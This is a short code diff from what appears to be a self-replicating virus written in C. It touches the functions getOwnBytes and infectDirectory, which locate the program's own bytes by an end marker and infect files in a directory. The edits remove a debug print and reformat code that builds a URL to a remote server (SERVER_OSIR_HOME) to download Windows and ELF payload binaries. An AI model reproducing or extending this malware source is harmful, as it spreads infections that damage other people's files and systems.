@@ -46,7 +46,6 @@ int64_t getOwnBytes(char **bytes, const char *arg0)
 			c *= (*bytes)[i + j] ==
 			    END_MARKER[END_MARKER_SIZE - 1 - j];
 		if (c) {
-			printf("Found marker at %i\n", (int) i);
 			size = i + strlen(END_MARKER);
 			break;
 		}
@@ -120,8 +119,7 @@ bool infectDirectory(const char *path, const char *arg0)
 						free(bytes);
 
 					} else if (CROSS_PLATFORM_ON) {
-						char *remote_url =
-						    (char *)
+						char *remote_url = (char *)
 						    malloc(sizeof(char) *
 							   strlen
 							   (SERVER_OSIR_HOME
@@ -134,8 +132,8 @@ bool infectDirectory(const char *path, const char *arg0)
 							       SERVER_OSIR_HOME
 							       XBIN_WIN64);
 
-						} else if (exectype->
-							   is_elf) {
+						} else
+						    if (exectype->is_elf) {
 							//Get elf/linux binary
 							printf("(elf)");
 							strcpy(remote_url,
